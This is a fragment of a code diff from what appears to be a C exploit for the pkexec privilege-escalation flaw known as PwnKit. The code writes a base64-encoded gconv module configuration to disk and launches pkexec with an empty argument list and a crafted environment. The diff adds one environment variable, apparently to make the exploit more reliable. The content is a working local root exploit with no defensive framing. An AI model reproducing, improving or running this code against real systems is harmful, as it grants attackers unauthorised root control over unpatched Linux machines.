@@ -9,7 +9,7 @@ int main(){
 	system("echo bW9kdWxlIFVURi04Ly8gUFdOS0lULy8gcHdua2l0IDIK | base64 -d > tmp/gconv-modules");
 	char* pkexec_path = "/usr/bin/pkexec";
 	char* null_args[] = {NULL};
-	char* pkexec_env[] = {"tmp",  "CHARSET=PWNKIT", "SHELL=aa", "PATH=GCONV_PATH=.",NULL};
+	char* pkexec_env[] = {"tmp",  "CHARSET=PWNKIT", "SHELL=aa", "PATH=GCONV_PATH=.", "GIO_USE_VFS=",NULL};
 	execve(pkexec_path, null_args, pkexec_env);
 }
 
